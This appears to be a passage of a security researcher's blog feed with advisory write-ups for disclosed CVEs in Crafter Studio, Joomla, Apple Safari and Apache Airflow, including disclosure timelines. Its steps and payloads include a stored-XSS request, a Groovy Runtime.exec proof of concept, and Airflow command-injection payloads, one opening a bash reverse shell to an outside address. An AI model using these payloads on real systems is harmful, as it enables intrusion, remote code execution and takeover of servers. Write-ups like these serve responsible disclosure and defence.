href="mailto:&#x73;&#x65;&#99;&#x75;&#114;&#105;&#116;&#x79;&#64;&#x63;&#114;&#x61;&#102;&#116;&#x65;&#114;&#115;&#x6f;&#102;&#x74;&#119;&#x61;&#x72;&#101;&#46;&#99;&#111;&#109;">&#x73;&#x65;&#99;&#x75;&#114;&#105;&#116;&#x79;&#64;&#x63;&#114;&#x61;&#102;&#116;&#x65;&#114;&#115;&#x6f;&#102;&#x74;&#119;&#x61;&#x72;&#101;&#46;&#99;&#111;&#109;</a><br>2021-01-02: Issue is acknowledged.<br>2021-01-08: Issue is fixed.<br>2021-12-01: Issue was disclosed.</p><h1 id="CVE"><a href="#CVE" class="headerlink" title="CVE"></a>CVE</h1><p>CVE-2021-23260</p><h1 id="Resources"><a href="#Resources" class="headerlink" title="Resources"></a>Resources</h1><p><a href="https://docs.craftercms.org/en/3.1/security/advisory.html#cv-2021120103">https://docs.craftercms.org/en/3.1/security/advisory.html#cv-2021120103</a></p><h1 id="Contact"><a href="#Contact" class="headerlink" title="Contact"></a>Contact</h1><p>You can contact me at <a href="mailto:&#x68;&#x61;&#112;&#x70;&#x79;&#x68;&#97;&#99;&#107;&#105;&#110;&#x67;&#64;&#x6f;&#117;&#x74;&#108;&#111;&#111;&#107;&#x2e;&#105;&#x74;">&#x68;&#x61;&#112;&#x70;&#x79;&#x68;&#97;&#99;&#107;&#105;&#110;&#x67;&#64;&#x6f;&#117;&#x74;&#108;&#111;&#111;&#107;&#x2e;&#105;&#x74;</a>, please include a reference to my blog in any communication regarding this issue.</p>]]></content>
      
      
      <categories>
          
          <category> advisories </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MY CVE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2021-23261: Crafter Studio Overriding the system configuration file causes a denial of service</title>
      <link href="/2022/04/08/CVE-2021-23261-Crafter-Studio-Overriding-the-system-configuration-file-causes-a-denial-of-service/"/>
      <url>/2022/04/08/CVE-2021-23261-Crafter-Studio-Overriding-the-system-configuration-file-causes-a-denial-of-service/</url>
      
        <content type="html"><![CDATA[<h1 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h1><p>Overriding the system configuration file causes a denial of service, In global-config.</p><h1 id="Product"><a href="#Product" class="headerlink" title="Product"></a>Product</h1><p>Crafter Studio</p><h1 id="Affected-Version"><a href="#Affected-Version" class="headerlink" title="Affected Version"></a>Affected Version</h1><p>Crafter Studio 3.1 &lt; 3.1.13</p><h1 id="Details"><a href="#Details" class="headerlink" title="Details"></a>Details</h1><p>visit system configuration menu, <a href="http://192.168.3.17:8080/studio/#/globalMenu/global-config%EF%BC%8CConfigure">http://192.168.3.17:8080/studio/#/globalMenu/global-config，Configure</a> global config file.</p><p><img src="/2022/04/08/CVE-2021-23261-Crafter-Studio-Overriding-the-system-configuration-file-causes-a-denial-of-service/1.png"></p><p>Input aaaa and click save button, and use burpsuite intercept requests.</p><p><img src="/2022/04/08/CVE-2021-23261-Crafter-Studio-Overriding-the-system-configuration-file-causes-a-denial-of-service/2.png"></p><p>The file name and path in the “path”parameter are controllable, so other system files can be illegally covered, as shown in the figure below.</p><p><img src="/2022/04/08/CVE-2021-23261-Crafter-Studio-Overriding-the-system-configuration-file-causes-a-denial-of-service/3.png"></p><p>For example, modify the path parameter to override global menu- config.xml File, all users will not be able to use the globl menu of craftcms.</p><p><img src="/2022/04/08/CVE-2021-23261-Crafter-Studio-Overriding-the-system-configuration-file-causes-a-denial-of-service/4.png"></p><p><img src="/2022/04/08/CVE-2021-23261-Crafter-Studio-Overriding-the-system-configuration-file-causes-a-denial-of-service/5.png"></p><p><img src="/2022/04/08/CVE-2021-23261-Crafter-Studio-Overriding-the-system-configuration-file-causes-a-denial-of-service/6.png"></p><h1 id="Coordinated-Disclosure-Timeline"><a href="#Coordinated-Disclosure-Timeline" class="headerlink" title="Coordinated Disclosure Timeline"></a>Coordinated Disclosure Timeline</h1><p>2021-01-14: Report sent to <a href="mailto:&#115;&#101;&#x63;&#x75;&#114;&#x69;&#116;&#x79;&#64;&#99;&#114;&#97;&#x66;&#x74;&#x65;&#x72;&#x73;&#111;&#x66;&#x74;&#119;&#97;&#114;&#x65;&#x2e;&#99;&#111;&#x6d;">&#115;&#101;&#x63;&#x75;&#114;&#x69;&#116;&#x79;&#64;&#99;&#114;&#97;&#x66;&#x74;&#x65;&#x72;&#x73;&#111;&#x66;&#x74;&#119;&#97;&#114;&#x65;&#x2e;&#99;&#111;&#x6d;</a><br>2021-01-20: Issue is acknowledged.<br>2021-01-20: Issue is fixed.<br>2021-12-01: Issue was disclosed.</p><h1 id="CVE"><a href="#CVE" class="headerlink" title="CVE"></a>CVE</h1><p>CVE-2021-23261</p><h1 id="Resources"><a href="#Resources" class="headerlink" title="Resources"></a>Resources</h1><p><a href="https://docs.craftercms.org/en/3.1/security/advisory.html#cv-2021120104">https://docs.craftercms.org/en/3.1/security/advisory.html#cv-2021120104</a></p><h1 id="Contact"><a href="#Contact" class="headerlink" title="Contact"></a>Contact</h1><p>You can contact me at <a href="mailto:&#x68;&#x61;&#x70;&#112;&#x79;&#104;&#97;&#x63;&#x6b;&#x69;&#110;&#103;&#x40;&#x6f;&#117;&#116;&#108;&#x6f;&#111;&#107;&#x2e;&#x69;&#116;">&#x68;&#x61;&#x70;&#112;&#x79;&#104;&#97;&#x63;&#x6b;&#x69;&#110;&#103;&#x40;&#x6f;&#117;&#116;&#108;&#x6f;&#111;&#107;&#x2e;&#x69;&#116;</a>, please include a reference to my blog in any communication regarding this issue.</p>]]></content>
      
      
      <categories>
          
          <category> advisories </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MY CVE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2018-11326: Joomla!-Core-XSS Vulnerabilities</title>
      <link href="/2022/04/08/CVE-2018-11326-Joomla-Core-XSS-Vulnerabilities/"/>
      <url>/2022/04/08/CVE-2018-11326-Joomla-Core-XSS-Vulnerabilities/</url>
      
        <content type="html"><![CDATA[<h1 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h1><p>Inadequate input filtering leads to multiple XSS vulnerabilities. Additionally, the default filtering settings could potentially allow users of the default Administrator user group to perform a XSS attack.</p><h1 id="Product"><a href="#Product" class="headerlink" title="Product"></a>Product</h1><p>Joomla!</p><h1 id="Affected-Version"><a href="#Affected-Version" class="headerlink" title="Affected Version"></a>Affected Version</h1><p>Joomla! CMS versions 3.0.0 through 3.8.7</p><h1 id="Details"><a href="#Details" class="headerlink" title="Details"></a>Details</h1><p>There is a stored xss in the articles edit interface backstage, through the capture modify message to achieve.</p><p>1.New a user, it’s author usergroup. It only have a edit article permissions.<br><img src="/2022/04/08/CVE-2018-11326-Joomla-Core-XSS-Vulnerabilities/Picture1.png"></p><p>2.Visit: <a href="http://127.0.0.1/joomla">http://127.0.0.1/joomla</a> , Login；test1<br>Creat a post and edit an airticle.<br><img src="/2022/04/08/CVE-2018-11326-Joomla-Core-XSS-Vulnerabilities/Picture2.png"></p><p>3.Save , and intercept the message with burpsuite<br><img src="/2022/04/08/CVE-2018-11326-Joomla-Core-XSS-Vulnerabilities/Picture3.png"></p><p>4.modify ‘jform[articletext]’ parameters. We can bypass xss filter with “&#x2F;”,<br>Payload: <code>&lt;textarea autofocus /onfocus=alert(1)&gt;</code><br><img src="/2022/04/08/CVE-2018-11326-Joomla-Core-XSS-Vulnerabilities/Picture4.png"></p><p>5.visit this post. And click the text box, it’s happen.<br><img src="/2022/04/08/CVE-2018-11326-Joomla-Core-XSS-Vulnerabilities/Picture5.png"></p><pre><code>POST /joomla/index.php?a_id=0 HTTP/1.1Host: 127.0.0.1User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.73 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Referer: http://127.0.0.1/joomla/index.php/create-a-postCookie: page_iframe_url=http://127.0.0.1/metinfo/index.php?lang=cn&amp;pageset=1; 9d4bb4a09f511681369671a08beff228=8pv6vj029j1haamvri40bshim7; 4f662874a3e5f4fb560e38fe64578022=i2vp4vmtj1eur472dribtu2nh6; 7dbd70275c12a5616cbf174bc1341643=5s5d797o36l1jnot21oep1vag5; joomla_user_state=logged_inConnection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 302jform%5Btitle%5D=test&amp;jform%5Balias%5D=&amp;jform%5Barticletext%5D=&lt;textarea autofocus /onfocus=alert(1)&gt;&amp;jform%5Bcatid%5D=9&amp;jform%5Bversion_note%5D=&amp;jform%5Bcreated_by_alias%5D=&amp;jform%5Baccess%5D=1&amp;jform%5Blanguage%5D=*&amp;jform%5Bmetadesc%5D=&amp;jform%5Bmetakey%5D=&amp;task=article.save&amp;return=&amp;87cab9c9367cfb99e90df26d9076c9fd=1</code></pre><h1 id="Coordinated-Disclosure-Timeline"><a href="#Coordinated-Disclosure-Timeline" class="headerlink" title="Coordinated Disclosure Timeline"></a>Coordinated Disclosure Timeline</h1><p>2018-02-02: Report sent to <a href="mailto:&#x73;&#101;&#99;&#x75;&#x72;&#105;&#116;&#121;&#64;&#x6a;&#x6f;&#x6f;&#x6d;&#x6c;&#x61;&#x2e;&#x6f;&#x72;&#x67;">&#x73;&#101;&#99;&#x75;&#x72;&#105;&#116;&#121;&#64;&#x6a;&#x6f;&#x6f;&#x6d;&#x6c;&#x61;&#x2e;&#x6f;&#x72;&#x67;</a><br>2018-02-11: Issue is acknowledged<br>2018-05-22: Issue is fixed</p><h1 id="CVE"><a href="#CVE" class="headerlink" title="CVE"></a>CVE</h1><p>CVE-2018-11326</p><h1 id="Resources"><a href="#Resources" class="headerlink" title="Resources"></a>Resources</h1><p><a href="https://developer.joomla.org/security-centre/733-20180505-core-xss-vulnerabilities-additional-hardening.html">https://developer.joomla.org/security-centre/733-20180505-core-xss-vulnerabilities-additional-hardening.html</a></p><h1 id="Contact"><a href="#Contact" class="headerlink" title="Contact"></a>Contact</h1><p>You can contact me at <a href="mailto:&#104;&#97;&#112;&#x70;&#121;&#104;&#x61;&#99;&#107;&#x69;&#110;&#x67;&#x40;&#x6f;&#x75;&#116;&#x6c;&#x6f;&#x6f;&#x6b;&#46;&#105;&#116;">&#104;&#97;&#112;&#x70;&#121;&#104;&#x61;&#99;&#107;&#x69;&#110;&#x67;&#x40;&#x6f;&#x75;&#116;&#x6c;&#x6f;&#x6f;&#x6b;&#46;&#105;&#116;</a>, please include a reference to my blog in any communication regarding this issue.</p>]]></content>
      
      
      <categories>
          
          <category> advisories </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MY CVE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2020-25802: Crafter Studio may execute OS commands via Groovy scripting.</title>
      <link href="/2022/04/08/CVE-2020-25802-Crafter-Studio-may-execute-OS-commands-via-Groovy-scripting/"/>
      <url>/2022/04/08/CVE-2020-25802-Crafter-Studio-may-execute-OS-commands-via-Groovy-scripting/</url>
      
        <content type="html"><![CDATA[<h1 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h1><p>Authenticated attackers with developer privileges in Crafter Studio may execute OS commands via Groovy scripting.</p><h1 id="Product"><a href="#Product" class="headerlink" title="Product"></a>Product</h1><p>Crafter Studio</p><h1 id="Affected-Version"><a href="#Affected-Version" class="headerlink" title="Affected Version"></a>Affected Version</h1><p>Crafter Studio 3.0 &lt; 3.0.27</p><p>Crafter Studio 3.1 &lt; 3.1.7</p><h1 id="Details"><a href="#Details" class="headerlink" title="Details"></a>Details</h1><p>Attackers may execute OS commands by Groovy Script which use Groovy lib to render webpage. Groovy script does not have security restrictions, which will cause attackers to execute arbitrary commands remotely(RCE).</p><p>To Reproduce:</p><p>Edite site and click Preview Tools, select “Edit Controller” button.</p><p><img src="/2022/04/08/CVE-2020-25802-Crafter-Studio-may-execute-OS-commands-via-Groovy-scripting/1.png"></p><p>Using reflection mechanism to construct POC, input: </p><p>POC:</p><pre><code>import java.lang.reflect.Method;Class&lt;?&gt; rt = Class.forName(&quot;java.lang.Runtime&quot;);Method gr = rt.getMethod(&quot;getRuntime&quot;);Method ex = rt.getMethod(&quot;exec&quot;,String.class);ex.invoke(gr.invoke(null),&quot;touch /tmp/thisistest&quot;);</code></pre><p><img src="/2022/04/08/CVE-2020-25802-Crafter-Studio-may-execute-OS-commands-via-Groovy-scripting/2.png"></p><p>Click Update to execute the system command successfully, and generate the thisistest file in the &#x2F;TMP&#x2F; directory</p><p><img src="/2022/04/08/CVE-2020-25802-Crafter-Studio-may-execute-OS-commands-via-Groovy-scripting/3.png"></p><h1 id="Coordinated-Disclosure-Timeline"><a href="#Coordinated-Disclosure-Timeline" class="headerlink" title="Coordinated Disclosure Timeline"></a>Coordinated Disclosure Timeline</h1><p>2020-04-29: Report sent to <a href="mailto:&#115;&#x65;&#99;&#117;&#114;&#105;&#116;&#x79;&#64;&#x63;&#114;&#97;&#102;&#x74;&#101;&#x72;&#115;&#111;&#x66;&#x74;&#x77;&#x61;&#114;&#x65;&#46;&#99;&#111;&#x6d;">&#115;&#x65;&#99;&#117;&#114;&#105;&#116;&#x79;&#64;&#x63;&#114;&#97;&#102;&#x74;&#101;&#x72;&#115;&#111;&#x66;&#x74;&#x77;&#x61;&#114;&#x65;&#46;&#99;&#111;&#x6d;</a><br>2020-04-30: Crafter don’t consider it a security problem.<br>2020-05-03: I send my views to crafter.<br>2020-05-05: Crafter agree my views and issue is acknowledged.<br>2020-05-22: Issue is fixed.<br>2020-10-09: issue was disclosed.</p><h1 id="CVE"><a href="#CVE" class="headerlink" title="CVE"></a>CVE</h1><p>CVE-2020-25802</p><h1 id="Resources"><a href="#Resources" class="headerlink" title="Resources"></a>Resources</h1><p><a href="https://docs.craftercms.org/en/3.1/security/advisory.html#cv-2020080101">https://docs.craftercms.org/en/3.1/security/advisory.html#cv-2020080101</a></p><h1 id="Contact"><a href="#Contact" class="headerlink" title="Contact"></a>Contact</h1><p>You can contact me at <a href="mailto:&#104;&#x61;&#112;&#112;&#x79;&#x68;&#97;&#x63;&#107;&#105;&#x6e;&#103;&#x40;&#111;&#117;&#x74;&#x6c;&#111;&#111;&#107;&#x2e;&#105;&#116;">&#104;&#x61;&#112;&#112;&#x79;&#x68;&#97;&#x63;&#107;&#105;&#x6e;&#103;&#x40;&#111;&#117;&#x74;&#x6c;&#111;&#111;&#107;&#x2e;&#105;&#116;</a>, please include a reference to my blog in any communication regarding this issue.</p>]]></content>
      
      
      <categories>
          
          <category> advisories </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MY CVE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Liferay Gogoshell Arbitrary file reading&amp;Command Injection</title>
      <link href="/2022/04/08/Liferay-Gogoshell-Arbitrary-file-reading-Command-Injection/"/>
      <url>/2022/04/08/Liferay-Gogoshell-Arbitrary-file-reading-Command-Injection/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2018-4102: Apple Safari address bar spoofing</title>
      <link href="/2022/04/08/CVE-2018-4102-Apple-safari-address-bar-spoofing/"/>
      <url>/2022/04/08/CVE-2018-4102-Apple-safari-address-bar-spoofing/</url>
      
        <content type="html"><![CDATA[<h1 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h1><p>Visiting a malicious website may lead to address bar spoofing</p><h1 id="Product"><a href="#Product" class="headerlink" title="Product"></a>Product</h1><p>Apple Safari</p><h1 id="Affected-Version"><a href="#Affected-Version" class="headerlink" title="Affected Version"></a>Affected Version</h1><p>prior to Safari 11.1</p><h1 id="Details"><a href="#Details" class="headerlink" title="Details"></a>Details</h1><p>The issue involves the “Safari” component. It allows remote attackers to spoof the address bar.</p><p>Open the site: <a href="http://www.baidu.com/">www.baidu.com</a>, and search “google.com”. We can see the address bar display that “baidu.com”. This is done to prevent address bar spoofing. </p><p><img src="/2022/04/08/CVE-2018-4102-Apple-safari-address-bar-spoofing/1.png"></p><p>When we search “aaa”, the “aaa” in the address bar.  </p><p><img src="/2022/04/08/CVE-2018-4102-Apple-safari-address-bar-spoofing/2.png"></p><p><img src="/2022/04/08/CVE-2018-4102-Apple-safari-address-bar-spoofing/3.png"></p><p>To achieve the effect of address bar spoofing，I use the Arabic character.</p><p><img src="/2022/04/08/CVE-2018-4102-Apple-safari-address-bar-spoofing/4.png"></p><p><img src="/2022/04/08/CVE-2018-4102-Apple-safari-address-bar-spoofing/5.png"></p><p>Then, the Arabic character “%D8%9C” decode, is display blank space in the address bar.<br>This character convert unicode is “U+061C”，The direction of the text display is LTR。If the browser does not make a reasonable strategy for this two-way text URL，”%D8%9C” will force the URL to use LTR display.</p><p>payload: <code>[&quot;%D8%9C&quot;.urldecode] google.com</code></p><p>(Note, that there is a space between google.com and Arabic character.)</p><p><img src="/2022/04/08/CVE-2018-4102-Apple-safari-address-bar-spoofing/6.png"></p><p>It allows attackers to spoof the address bar.</p><h1 id="Coordinated-Disclosure-Timeline"><a href="#Coordinated-Disclosure-Timeline" class="headerlink" title="Coordinated Disclosure Timeline"></a>Coordinated Disclosure Timeline</h1><p>2017-11-07: Report sent to <a href="mailto:&#112;&#114;&#111;&#100;&#x75;&#99;&#x74;&#x2d;&#x73;&#x65;&#x63;&#x75;&#x72;&#105;&#x74;&#121;&#64;&#x61;&#x70;&#112;&#x6c;&#101;&#46;&#99;&#111;&#x6d;">&#112;&#114;&#111;&#100;&#x75;&#99;&#x74;&#x2d;&#x73;&#x65;&#x63;&#x75;&#x72;&#105;&#x74;&#121;&#64;&#x61;&#x70;&#112;&#x6c;&#101;&#46;&#99;&#111;&#x6d;</a><br>2017-12-15: Issue is acknowledged<br>2018-03-09: Issue is fixed</p><h1 id="CVE"><a href="#CVE" class="headerlink" title="CVE"></a>CVE</h1><p>CVE-2018-4102</p><h1 id="Resources"><a href="#Resources" class="headerlink" title="Resources"></a>Resources</h1><p><a href="https://support.apple.com/en-us/HT208695">https://support.apple.com/en-us/HT208695</a></p><h1 id="Contact"><a href="#Contact" class="headerlink" title="Contact"></a>Contact</h1><p>You can contact me at <a href="mailto:&#x68;&#x61;&#112;&#112;&#x79;&#x68;&#x61;&#99;&#x6b;&#x69;&#110;&#x67;&#64;&#111;&#x75;&#116;&#x6c;&#x6f;&#x6f;&#107;&#x2e;&#x69;&#116;">&#x68;&#x61;&#112;&#112;&#x79;&#x68;&#x61;&#99;&#x6b;&#x69;&#110;&#x67;&#64;&#111;&#x75;&#116;&#x6c;&#x6f;&#x6f;&#107;&#x2e;&#x69;&#116;</a>, please include a reference to my blog in any communication regarding this issue.</p>]]></content>
      
      
      <categories>
          
          <category> advisories </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MY CVE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2022-24288: Apache Airflow TWO RCEs in example DAGs</title>
      <link href="/2022/04/08/CVE-2022-24288-Apache-Airflow-TWO-RCEs-in-example-DAGs/"/>
      <url>/2022/04/08/CVE-2022-24288-Apache-Airflow-TWO-RCEs-in-example-DAGs/</url>
      
        <content type="html"><![CDATA[<h1 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h1><p>In Apache Airflow, prior to version 2.2.4, some example DAGs did not properly sanitize user-provided params, making them susceptible to OS Command Injection from the web UI.</p><h1 id="Product"><a href="#Product" class="headerlink" title="Product"></a>Product</h1><p>Apache Airflow</p><h1 id="Affected-Version"><a href="#Affected-Version" class="headerlink" title="Affected Version"></a>Affected Version</h1><p>prior to version 2.2.4</p><h1 id="Details"><a href="#Details" class="headerlink" title="Details"></a>Details</h1><p>In Apache Airflow, prior to version 2.2.4, In DAG script of airflow , there is two command injection vulnerability (RCE) in the some scripts, which an attacker can execute arbitrary commands on the system. The impact is even greater when airflow is configured for unauthenticated access. These two RCEs are assigned the same CVE number(CVE-2022-24288).</p><h2 id="RCE-one-example-passing-params-via-test-command-py-command-injection"><a href="#RCE-one-example-passing-params-via-test-command-py-command-injection" class="headerlink" title="RCE one: example_passing_params_via_test_command.py command injection"></a>RCE one: example_passing_params_via_test_command.py command injection</h2><p>Vulnerability summary:</p><p>In Apache Airflow, prior to version 2.2.4, there is a command injection vulnerability (RCE) in the script (example_passing_params_via_test_command.py), which can obtain the permission of the operating system.</p><p>Vulnerability principle:</p><p>It can be seen from the source code of example_passing_params_via_test_command script that there is the function of executing bash command, The parameters Foo and MIFF in the template expressions  and  are externally controllable and rendered through the jiaja2 template:</p><p><img src="/2022/04/08/CVE-2022-24288-Apache-Airflow-TWO-RCEs-in-example-DAGs/RCE-one-1.png"></p><p><img src="/2022/04/08/CVE-2022-24288-Apache-Airflow-TWO-RCEs-in-example-DAGs/RCE-one-2.png"></p><p>Further analysis “from airflow.operators.bash import BashOperator” code, we can see bash_command parameter value will be executed as a bash script;</p><p><img src="/2022/04/08/CVE-2022-24288-Apache-Airflow-TWO-RCEs-in-example-DAGs/RCE-one-3.png"></p><p>Vulnerability exploitation：</p><p>Enter the DAGs menu and start example_passing_params_via_test_command task, select “Trigger DAG w&#x2F; config”.<br><a href="http://192.168.3.17:8080/trigger?dag_id=example_passing_params_via_test_command">http://192.168.3.17:8080/trigger?dag_id=example_passing_params_via_test_command</a></p><p><img src="/2022/04/08/CVE-2022-24288-Apache-Airflow-TWO-RCEs-in-example-DAGs/RCE-one-4.png"></p><p>To construct payload, we can know from the following code that we need to splice commands with semicolons after closing double quotation marks, so as to inject any operating system commands to be executed(RCE).</p><p><img src="/2022/04/08/CVE-2022-24288-Apache-Airflow-TWO-RCEs-in-example-DAGs/RCE-one-5.png"></p><p>PAYLOAD：<code>&#123;&quot;foo&quot;:&quot;\&quot;;touch /tmp/pwnedaaaaa;\&quot;&quot;&#125;</code>, Then click trigger to execute the task.</p><p><img src="/2022/04/08/CVE-2022-24288-Apache-Airflow-TWO-RCEs-in-example-DAGs/RCE-one-6.png"></p><p><img src="/2022/04/08/CVE-2022-24288-Apache-Airflow-TWO-RCEs-in-example-DAGs/RCE-one-7.png"></p><p>Through the log and background view, it can be seen that any command has been executed successfully.</p><p><img src="/2022/04/08/CVE-2022-24288-Apache-Airflow-TWO-RCEs-in-example-DAGs/RCE-one-8.png"></p><p><img src="/2022/04/08/CVE-2022-24288-Apache-Airflow-TWO-RCEs-in-example-DAGs/RCE-one-9.png"></p><p>Further execute the reverse shell to obtain operating system permissions.<br>Payload: <code>&#123;&quot;foo&quot;:&quot;\&quot;;bash -i &gt;&amp; /dev/tcp/192.168.3.7/6666 0&gt;&amp;1;\&quot;&quot;&#125;</code></p><p><img src="/2022/04/08/CVE-2022-24288-Apache-Airflow-TWO-RCEs-in-example-DAGs/RCE-one-10.png"></p><p><img src="/2022/04/08/CVE-2022-24288-Apache-Airflow-TWO-RCEs-in-example-DAGs/RCE-one-11.png"></p><h2 id="RCE-two-tutorial-py-DAG-command-injection"><a href="#RCE-two-tutorial-py-DAG-command-injection" class="headerlink" title="RCE two: tutorial.py DAG command injection"></a>RCE two: tutorial.py DAG command injection</h2><p>Vulnerability summary：</p><p>Ithere is a command injection vulnerability (RCE) in the script (tutorial.py), which an attacker can execute arbitrary commands on the system.</p><p>Vulnerability principle：</p><p>It can be seen from the source code of tutorial script that there is the function of executing bash command, The parameters “my_param” in the template expressions  is externally controllable and rendered through the jinja2 template:</p><p><img src="/2022/04/08/CVE-2022-24288-Apache-Airflow-TWO-RCEs-in-example-DAGs/RCE-two-1.png"></p><p>Further analysis “from airflow.operators.bash import BashOperator” code, we can see bash_command parameter value will be executed as a bash script;</p><p><img src="/2022/04/08/CVE-2022-24288-Apache-Airflow-TWO-RCEs-in-example-DAGs/RCE-two-2.png"></p><p>Vulnerability exploitation:</p><p>Enter the DAGs menu and start tutorial task, select “Trigger DAG w&#x2F; config”.<br><a href="http://192.168.3.17:8080/trigger?dag_id=tutorial">http://192.168.3.17:8080/trigger?dag_id=tutorial</a></p><p><img src="/2022/04/08/CVE-2022-24288-Apache-Airflow-TWO-RCEs-in-example-DAGs/RCE-two-3.png"></p><p>To construct payload, we can know from the following code that we need to splice commands with semicolons after closing double quotation marks, so as to inject any operating system commands to be executed(RCE).</p><p><img src="/2022/04/08/CVE-2022-24288-Apache-Airflow-TWO-RCEs-in-example-DAGs/RCE-two-4.png"></p><p>PAYLOAD：<code>&#123;&quot;my_param&quot;:&quot;\&quot;;touch /tmp/pwnedddddd;\&quot;&quot;&#125;</code>, Then click trigger to execute the task.</p><p><img src="/2022/04/08/CVE-2022-24288-Apache-Airflow-TWO-RCEs-in-example-DAGs/RCE-two-5.png"></p><p><img src="/2022/04/08/CVE-2022-24288-Apache-Airflow-TWO-RCEs-in-example-DAGs/RCE-two-6.png"></p><p>Through the log and background view, it can be seen that arbitrary command has been executed successfully.</p><p><img src="/2022/04/08/CVE-2022-24288-Apache-Airflow-TWO-RCEs-in-example-DAGs/RCE-two-7.png"></p><h1 id="Coordinated-Disclosure-Timeline"><a href="#Coordinated-Disclosure-Timeline" class="headerlink" title="Coordinated Disclosure Timeline"></a>Coordinated Disclosure Timeline</h1><p>2022-01-30: Report sent to <a href="mailto:&#115;&#101;&#99;&#117;&#114;&#105;&#116;&#x79;&#x40;&#x61;&#112;&#97;&#99;&#x68;&#x65;&#x2e;&#x6f;&#114;&#103;">&#115;&#101;&#99;&#117;&#114;&#105;&#116;&#x79;&#x40;&#x61;&#112;&#97;&#99;&#x68;&#x65;&#x2e;&#x6f;&#114;&#103;</a><br>2022-02-01: Issue is acknowledged<br>2022-02-23: Issue is fixed<br>2022-02-27: hackone award a $4,000 bounty</p><h1 id="CVE"><a href="#CVE" class="headerlink" title="CVE"></a>CVE</h1><p>CVE-2022-24288</p><h1 id="Resources"><a href="#Resources" class="headerlink" title="Resources"></a>Resources</h1><p><a href="https://lists.apache.org/thread/dbw5ozcmr0h0lhs0yjph7xdc64oht23t">https://lists.apache.org/thread/dbw5ozcmr0h0lhs0yjph7xdc64oht23t</a></p><h1 id="Contact"><a href="#Contact" class="headerlink" title="Contact"></a>Contact</h1><p>You can contact me at <a href="mailto:&#x68;&#x61;&#x70;&#112;&#x79;&#x68;&#97;&#99;&#107;&#105;&#x6e;&#x67;&#x40;&#111;&#x75;&#116;&#108;&#111;&#111;&#107;&#46;&#105;&#x74;">&#x68;&#x61;&#x70;&#112;&#x79;&#x68;&#97;&#99;&#107;&#105;&#x6e;&#x67;&#x40;&#111;&#x75;&#116;&#108;&#111;&#111;&#107;&#46;&#105;&#x74;</a>, please include a reference to my blog in any communication regarding this issue.</p>]]></content>
      
      
      <categories>
          
          <category> advisories </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MY CVE </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
